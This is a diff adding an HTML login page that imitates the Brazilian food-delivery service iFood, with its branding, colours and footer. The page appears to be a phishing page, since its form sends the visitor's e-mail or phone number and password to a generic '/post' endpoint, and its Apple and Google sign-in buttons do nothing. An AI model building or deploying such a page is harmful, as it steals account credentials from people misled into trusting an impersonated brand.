@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iFood - Entrar</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #EA1D2C 0%, #B5121D 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px 32px;
+            width: 90%;
+            max-width: 380px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 48px;
+        }
+
+        h1 {
+            color: #3E3E3E;
+            font-size: 22px;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        p {
+            color: #717171;
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #E0E0E0;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #F7F7F7;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #EA1D2C;
+            background: #fff;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: #EA1D2C;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        button:hover {
+            background: #C4161F;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #E0E0E0;
+        }
+
+        .divider span {
+            padding: 0 16px;
+            color: #717171;
+            font-size: 14px;
+        }
+
+        .social-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fff;
+            color: #3E3E3E;
+            border: 1px solid #E0E0E0;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #717171;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">🍔</div>
+        <h1>Entre no iFood</h1>
+        <p>Acesse sua conta para fazer pedidos</p>
+        <form action="/post" method="post">
+            <div class="form-group">
+                <input type="text" name="user" placeholder="E-mail ou telefone" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="pass" placeholder="Senha" required>
+            </div>
+            <button type="submit">Entrar</button>
+        </form>
+        <div class="divider"><span>ou</span></div>
+        <button class="social-btn">🍎 Continuar com Apple</button>
+        <button class="social-btn">📱 Continuar com Google</button>
+        <div class="footer">iFood © 2024</div>
+    </div>
+</body>
+
+</html>
